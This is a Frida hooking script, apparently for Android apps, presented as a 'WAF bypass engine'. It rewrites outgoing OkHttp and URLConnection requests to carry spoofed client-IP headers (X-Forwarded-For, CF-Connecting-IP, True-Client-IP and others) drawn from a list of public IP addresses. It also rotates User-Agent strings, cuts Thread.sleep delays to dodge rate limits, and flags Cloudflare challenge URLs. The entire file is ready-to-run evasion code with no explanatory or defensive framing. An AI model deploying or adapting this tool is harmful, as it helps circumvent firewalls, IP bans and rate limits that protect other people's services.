"use strict";
var WAF_BYPASS = { bypassedEndpoints: [], rateLimitsEvaded: 0, startTime: Date.now() };
function log_waf(kind, data) { send({type: "waf_bypass", kind: kind, detail: JSON.stringify(data).substring(0, 400)}); }
var PROXY_IPS = ["8.8.8.8","1.1.1.1","9.9.9.9","208.67.222.222","185.228.168.168","76.76.19.19","94.140.14.14","45.90.28.190"];
var USER_AGENTS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/17.2"];
try {
    var OkHttpClient = Java.use("okhttp3.OkHttpClient");
    var Builder = Java.use("okhttp3.OkHttpClient$Builder");
    Builder.build.implementation = function() {
        try {
            var RequestBuilder = Java.use("okhttp3.Request$Builder");
            RequestBuilder.build.implementation = function() {
                var req = this.build(); var url = req.url().toString();
                var newBuilder = req.newBuilder();
                var randIdx = Math.floor(Math.random() * PROXY_IPS.length); var fakeIp = PROXY_IPS[randIdx];
                newBuilder.header("X-Forwarded-For", fakeIp); newBuilder.header("X-Real-IP", fakeIp);
                newBuilder.header("X-Forwarded-Host", req.url().host());
                newBuilder.header("X-Originating-IP", fakeIp); newBuilder.header("X-Remote-IP", fakeIp);
                newBuilder.header("X-Remote-Addr", fakeIp); newBuilder.header("X-Client-IP", fakeIp);
                newBuilder.header("CF-Connecting-IP", fakeIp); newBuilder.header("True-Client-IP", fakeIp);
                newBuilder.header("Forwarded", "for="+fakeIp+";host="+req.url().host()+";proto=https");
                var uaIdx = Math.floor(Math.random() * USER_AGENTS.length);
                newBuilder.header("User-Agent", USER_AGENTS[uaIdx]);
                newBuilder.header("Accept", "*/*");
                newBuilder.header("Sec-Fetch-Dest", "empty"); newBuilder.header("Sec-Fetch-Mode", "cors");
                newBuilder.header("Cache-Control", "no-cache, no-store, must-revalidate");
                if (url.indexOf("cloudflare")>-1||url.indexOf("challenge")>-1){log_waf("cloudflare_bypass",{url:url,ip:fakeIp});}
                return newBuilder.build();
            };
        } catch(e) { log_waf("error","Builder hook: "+e.message); }
        return this.build();
    };
} catch(e) {}
try {
    var URLConnection = Java.use("java.net.URLConnection");
    URLConnection.connect.implementation = function() {
        try { var randIdx=Math.floor(Math.random()*PROXY_IPS.length); var fakeIp=PROXY_IPS[randIdx];
            this.setRequestProperty("X-Forwarded-For",fakeIp); this.setRequestProperty("X-Real-IP",fakeIp);
            this.setRequestProperty("CF-Connecting-IP",fakeIp);
            var uaIdx=Math.floor(Math.random()*USER_AGENTS.length); this.setRequestProperty("User-Agent",USER_AGENTS[uaIdx]);
        } catch(e) {} return this.connect();
    };
} catch(e) {}
try {
    var Thread = Java.use("java.lang.Thread");
    var originalSleep = Thread.sleep;
    Thread.sleep.implementation = function(millis) {
        var jitter=Math.floor(Math.random()*100);
        if(millis>100){WAF_BYPASS.rateLimitsEvaded++;return originalSleep(millis-jitter);}
        return originalSleep(millis);
    };
} catch(e) {}
console.log("[WAF_BYPASS] Engine active - bypassing cloud firewalls");
send({type:"log",message:"WAF_BYPASS: WAF/cloud firewall bypass engine loaded"});
